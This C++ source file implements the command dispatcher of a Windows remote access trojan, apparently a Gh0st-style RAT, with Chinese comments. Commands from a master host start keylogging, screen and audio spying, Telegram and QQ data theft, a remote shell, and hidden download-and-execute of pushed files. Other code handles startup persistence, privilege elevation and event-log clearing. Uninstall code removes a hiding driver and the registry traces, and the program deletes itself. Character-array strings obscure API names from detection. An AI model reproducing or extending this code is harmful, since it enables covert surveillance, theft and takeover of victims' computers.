// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include <Shlwapi.h> // SHDeleteKey
#include "../driver/QAssist.h"
#include "../Myfunction.h"  //自定义函数

//////////////////////////////////////////////////////////////////////
extern BOOL DeleteMe();
extern BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);
extern Myfunction *pMyfunction;
extern HANDLE g_hMutexEntry, g_hMutexLogin;
extern HidContext g_hidContext;
extern SERVICE_STATUS_HANDLE hServiceStatus;
extern SERVICE_STATUS ServiceStatus;
extern std::map<DWORD, HANDLE> vShellCmdHandleList;

extern MODIFY_DATA modify_data;

//////////////////////////////////////////////////////////////////////
char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
HANDLE	hNewThreadInitializedEvent;

CKernelManager::CKernelManager(CClientSocket *pClient,LPCTSTR lpszMasterHost,UINT nMasterPort) : CManager(pClient)
{

	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);
	
	hNewThreadInitializedEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表示激活
	m_bIsActived = FALSE;
}

//筛选返回数据
void CKernelManager::SortProce(BOOL Strp)
{
	if (Strp)
	{
		BYTE bToken = TOKEN_INFO_YES;
		m_pClient->Send(&bToken, 1);
	}
	else
	{
		BYTE bToken = TOKEN_INFO_NO;
		m_pClient->Send(&bToken, 1);
	}
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, TRUE);
		break;
	case COMMAND_DLLMAIN:          // 视频插件
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DllManager,
			(lpBuffer + 1), 0, NULL);
		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
		break;
	case COMMAND_LIST_DRIVE:       // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY:       // 屏幕查看
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_SYSINFO:          // 主机管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysInfoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_AUDIO:            // 音频监听
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_TELEGRAM:            // 提取 T G
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_TelegramManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL:            // 远程终端
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: //键盘记录	
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,//通知打开键盘记录窗口
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		Sleep(10);		
		break;
	case COMMAND_SYSTEM:           // 系统管理，包括进程，窗口
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_REGEDIT:          // 注册表管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SERMANAGER:       // 服务管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SerManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_CHAT:             // 远程交谈
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ChatManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_QQINFO:           // 好友信息
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_QQInfoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_DOWN_EXEC:        // 远程下载
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
		break;
	case COMMAND_SENDFILE_HIDE:    // 隐藏运行
		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, SW_HIDE);
		m_pClient->m_DeCompressionBuffer.ReallyClearBuffer();
		m_pClient->m_CompressionBuffer.ReallyClearBuffer();
		break;
	case COMMAND_SENDFILE_SHOW:    // 显示运行
		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, SW_SHOW);
		m_pClient->m_DeCompressionBuffer.ReallyClearBuffer();
		m_pClient->m_CompressionBuffer.ReallyClearBuffer();
		break;
	case COMMAND_SENDFILE_NRUN:    // 如果插件无法上传手动上传dll
		RecvAndOpenFile((LPCTSTR)(lpBuffer + 1), nSize - 1, -1);
		m_pClient->m_DeCompressionBuffer.ReallyClearBuffer();
		m_pClient->m_CompressionBuffer.ReallyClearBuffer();
		break;
	case COMMAND_OPEN_URL_SHOW:    // 显示打开网页
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_OpenUrlShow,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
		break;
	case COMMAND_OPEN_URL_HIDE:    // 隐藏打开网页
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_OpenUrlHide,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
		break;
	case COMMAND_START:         //写入启动
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Start,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_Screensp:            //WIN10半屏
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Screen,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHOW_MSG:         // 发送信息
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_MessageBox,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);
		break;
	case COMMAND_PROXY_MAP:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ProxyManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;	
	case COMMAND_OnElevate_Privileges://WIN7提升权限
		CreateThread(NULL, 0,Win7Elevate_Privileges,NULL, 0, NULL);
		//Win7Elevate_Privileges();
		break;
	case COMMAND_ReStart_Exp: // 重启Exp
		CreateThread(NULL, 0,ReStartExp,NULL, 0, NULL);
		//ReStartExp();
		break;
	case COMMAND_ReStart_ieqc:
		CreateThread(NULL, 0,ReStartieqc,NULL, 0, NULL);
		break;
	case COMMAND_RESTART:          // 重启自身
		ReStartServer();
		break;
	case COMMAND_REMOVE:           // 卸载自身
		UnInstallServer();
		break;
	case COMMAND_CLEAN_EVENT:      // 清除日志
		CleanEvent();
		break;
	case COMMAND_SESSION:          // 会话管理
        ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK:    // 更改备注
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP:     // 更改分组
		SetInfo(modify_data.szGetGroup, (LPCTSTR)(lpBuffer + 1), "BITS");
		break;
	case COMMAND_SORT_PROCESS:     // 进程筛选
		Loop_SortProcess(lpBuffer + 1);
		SortProce(SortUOP);
		break;
	case COMMAND_SORT_WINDOW:      // 窗体筛选
		Loop_SortWindow(lpBuffer + 1);
		SortProce(SortUOP);
		break;
// 	case COMMAND_DLLCONTROL_GRADE: // 控件升级
// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DllControlupgrade,
// 			(LPVOID)(lpBuffer + 1), 0, NULL);
// 		break;
	case COMMAND_PRANK_CONTROL:
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_PrankControl,
			(LPVOID)lpBuffer[1], 0, NULL, true);
		WaitForSingleObject(hNewThreadInitializedEvent,INFINITE);;
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
	//	InterlockedExchange((LONG *)&m_bIsActived, TRUE);
		m_pClient->nHeartBeatCount++;
		break;
	}
}

BOOL CKernelManager::RecvAndOpenFile(const void *filedata, UINT size, INT nShowCmd)
{
	char zFiOL[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char yUfMS[]={'G','e','t','T','e','m','p','P','a','t','h','A','\0'};
	typedef DWORD (WINAPI *GetTempPathAT)(DWORD nBufferLength,LPSTR lpBuffer);
	GetTempPathAT pGetTempPathA=(GetTempPathAT)GetProcAddress(LoadLibrary(zFiOL),yUfMS);
	
	char EDlyBB[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary(zFiOL),EDlyBB);
	
	char strExePath[MAX_PATH], strRand[100];
	pGetTempPathA(sizeof(strExePath), strExePath);
	
	if (nShowCmd == -1)  //不去运行
	{
	    char UtKoF22[] = {'P','l','u','g','i','n','3','2','.','d','l','l','\0'};
     	sprintf(strRand, UtKoF22, GetTickCount());
	}
    else
	{
		char UtKoF23[] = {'R','u','%','d','%','s','\0'};
		sprintf(strRand, UtKoF23, GetTickCount(), filedata);
	}
	lstrcat(strExePath, strRand);
	
	HANDLE hFile=pCreateFileA(strExePath,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE) // 错误处理
		return false;
	DWORD dwBytesWrite;
	WriteFile(hFile,(char *)filedata+strlen((char *)filedata)+1,size-strlen((char *)filedata)-1,&dwBytesWrite,NULL); // 写入文件
	CloseHandle(hFile);
	
	if (nShowCmd == -1)  //不去运行
		return false;
	
	char *lpExt = pMyfunction->my_strrchr(strExePath, '.');
	if (!lpExt)
		return false;
	
	//char BvtmX12[] = {'o','p','e','n','\0'};
	if(GetFileAttributesA(strExePath) == -1)  //检查文件不存在
	    return false;
	return OpenFile1(strExePath, FALSE, nShowCmd);
    //return ShellExecute(NULL,BvtmX12,strExePath,NULL,NULL,nShowCmd) > (HINSTANCE)32; //正常运行目标文件
}

void CKernelManager::ReStartServer()
{
	//终止终端程序
	std::map<DWORD, HANDLE>::iterator it;
	DWORD dwProcessList, *lpdwProcessList, dwProcessCount;
	for (it = vShellCmdHandleList.begin(); it != vShellCmdHandleList.end(); it++)
	{
		while (!AttachConsole(it->first))
			Sleep(10);
		dwProcessCount = GetConsoleProcessList(&dwProcessList, 1);
		if (dwProcessCount > 1)
		{
			lpdwProcessList = new DWORD[dwProcessCount];
			GetConsoleProcessList(lpdwProcessList, dwProcessCount);
			for (int i = 0; i < dwProcessCount; i++)
			{
				if (lpdwProcessList[i] == GetCurrentProcessId())
					continue;
				if (lpdwProcessList[i] == it->first)
					continue;
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, lpdwProcessList[i]);
				if (hProcess == NULL)
					continue;
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
			delete[] lpdwProcessList;
		}
		while (!FreeConsole())
			Sleep(10);
		TerminateProcess(it->second, 0);
	}
	//当运行状态是服务时, 不能重启被控端程序(直接返回)
	if (hServiceStatus != NULL)
		return;
	CloseHandle(g_hMutexEntry);
	CloseHandle(g_hMutexLogin);
	
	if (!modify_data.bRunOnce)
	{
		if (modify_data.bService)
		{
			SC_HANDLE schManager = NULL, schService = NULL;
			schManager = OpenSCManager(NULL, NULL, STANDARD_RIGHTS_EXECUTE);
			if (schManager == NULL)
				return;
			schService = OpenService(schManager, modify_data.SerName, SERVICE_START);
			if (schService == NULL)
			{
				CloseServiceHandle(schManager);
				return;
			}
			if (!StartService(schService, 0, NULL))
			{
				CloseServiceHandle(schService);
				CloseServiceHandle(schManager);
				return;
			}
			CloseServiceHandle(schService);
			CloseServiceHandle(schManager);
		}
		else
		{
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			memset(&si,0,sizeof(si));
			memset(&pi,0,sizeof(pi));
			si.cb = sizeof(si);
			if (!CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
				return;
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}
	}
	else
	{
		char szCommandLine[1024];
		GetModuleFileName(NULL, szCommandLine, sizeof(szCommandLine));
		strcat(szCommandLine, " -inst");
		
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		memset(&si,0,sizeof(si));
		memset(&pi,0,sizeof(pi));
		si.cb = sizeof(si);
		if (!CreateProcess(NULL, szCommandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
			return;
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	//exit(0);
	ExitProcess(0);
}

void CKernelManager::UnInstallServer()
{
	//终止终端程序
	std::map<DWORD, HANDLE>::iterator it;
	DWORD dwProcessList, *lpdwProcessList, dwProcessCount;
	for (it = vShellCmdHandleList.begin(); it != vShellCmdHandleList.end(); it++)
	{
		while (!AttachConsole(it->first))
			Sleep(10);
		dwProcessCount = GetConsoleProcessList(&dwProcessList, 1);
		if (dwProcessCount > 1)
		{
			lpdwProcessList = new DWORD[dwProcessCount];
			GetConsoleProcessList(lpdwProcessList, dwProcessCount);
			for (int i = 0; i < dwProcessCount; i++)
			{
				if (lpdwProcessList[i] == GetCurrentProcessId())
					continue;
				if (lpdwProcessList[i] == it->first)
					continue;
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, lpdwProcessList[i]);
				if (hProcess == NULL)
					continue;
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
			delete[] lpdwProcessList;
		}
		while (!FreeConsole())
			Sleep(10);
		TerminateProcess(it->second, 0);
	}
	//卸载驱动程序
	if (g_hidContext != NULL) Hid_Destroy(g_hidContext);
	EnablePrivilege(SE_LOAD_DRIVER_NAME, TRUE);
	RtlInitUnicodeStringT RtlInitUnicodeString = (RtlInitUnicodeStringT)MyGetProcAddressA("NTDLL.DLL", "RtlInitUnicodeString");
	ZwUnloadDriverT ZwUnloadDriver = (ZwUnloadDriverT)MyGetProcAddressA("NTDLL.DLL", "ZwUnloadDriver");
	WCHAR szDriverServiceName[256];
	UNICODE_STRING usDriverServiceName;
	swprintf(szDriverServiceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%S", lpDriverName);
	RtlInitUnicodeString(&usDriverServiceName, szDriverServiceName);
	ZwUnloadDriver(&usDriverServiceName);
	EnablePrivilege(SE_LOAD_DRIVER_NAME, FALSE);
	//删除驱动服务
	char szDriverServiceKey[256];
	strcpy(szDriverServiceKey, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(szDriverServiceKey, lpDriverName);
	SHDeleteKey(HKEY_LOCAL_MACHINE, szDriverServiceKey);
	//删除自身服务
	SC_HANDLE schManager = NULL, schService = NULL;
	schManager = OpenSCManager(0, 0, SC_MANAGER_CONNECT);
	if (schManager != NULL)
	{
		schService = OpenService(schManager, modify_data.SerName, DELETE);
		if (schService != NULL)
		{
			DeleteService(schService);
			CloseServiceHandle(schService);
		}
		CloseServiceHandle(schManager);
	}
	//清理安装时间
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\Select", "MarkTime", 0, NULL, 0, 3);
	//清理备注信息
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\Setup", "Host", 0, NULL, 0, 3);
	//清理分组信息
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\BITS", modify_data.szGetGroup, 0, NULL, 0, 3);
	//删除视频插件
	char szPluginFile[MAX_PATH];
	char szPluginName[] = {'\\','b','P','l','u','g','i','n','V','i','d','e','o','.','d','l','l','\0'};
	GetSystemDirectory(szPluginFile, sizeof(szPluginFile));
	lstrcat(szPluginFile, szPluginName);
	DeleteFile(szPluginFile);
	//删除键盘记录
	char szRecordFile[MAX_PATH];
	char szKeylogName[] = {'\\','m','l','o','g','s','.','d','a','t','\0'};
	GetSystemDirectory(szRecordFile, sizeof(szRecordFile));
	lstrcat(szRecordFile, szKeylogName);
	DeleteFile(szRecordFile);
	//清理一些内存
	LocalFree(lpszUserSid);
	free((void *)lpConnInfos[0]);
	free((void *)lpConnInfos[1]);
	//删除驱动文件
	char szDriverPath[MAX_PATH];
	BOOL bIsWow64 = FALSE;
	GetWindowsDirectory(szDriverPath, MAX_PATH);
	IsWow64Process(GetCurrentProcess(), &bIsWow64);
	if (bIsWow64)
	{
		strcat(szDriverPath, "\\sysnative\\drivers\\");
		strcat(szDriverPath, lpDriverName);
		strcat(szDriverPath, ".sys");
	} else {
		strcat(szDriverPath, "\\system32\\drivers\\");
		strcat(szDriverPath, lpDriverName);
		strcat(szDriverPath, ".sys");
	}
	DeleteFile(szDriverPath);
	//删除程序自身
	if (hServiceStatus != NULL)
	{
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(hServiceStatus,&ServiceStatus);
	}
	DeleteMe();
	//exit(0);
	ExitProcess(0);
}

BOOL CKernelManager::IsActived()
{
	return	m_bIsActived;	
}
CKernelManager::CKernelManager(CClientSocket *pClient):CManager(pClient)
{
	m_nThreadCount = 0;
}
void CKernelManager::StartUnLineHook()
{	
	MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
}

void CKernelManager::ShutdownWindows(DWORD dwReason)
{
	EnablePrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	EnablePrivilege(SE_SHUTDOWN_NAME,FALSE);	
}
